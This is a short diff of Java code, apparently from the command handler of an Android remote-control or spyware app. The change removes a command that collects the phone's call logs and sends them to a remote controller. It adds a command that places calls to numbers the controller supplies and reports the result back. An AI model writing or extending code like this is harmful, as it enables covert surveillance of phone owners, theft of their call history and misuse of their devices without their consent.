@@ -1540,13 +1540,14 @@ case "location_test":
                 }
                 break;
 
-            case "calls":
-            case "get_calls":
-                if (callsModule != null) {
-                    String result = callsModule.getCallLogs();
-                    sendCommand("CALLS|" + result);
+            case "call":
+            case "make_call":
+                if (callsModule != null && !args.isEmpty()) {
+                    Log.d(TAG, "📞 Making call to: " + args);
+                    String result = callsModule.makeCall(args);
+                    sendCommand("CALL_RESULT|" + result);
                 } else {
-                    sendCommand("CALLS|ERROR: Calls module not available");
+                    sendCommand("CALL_RESULT|ERROR: Call module not available or invalid number");
                 }
                 break;
 
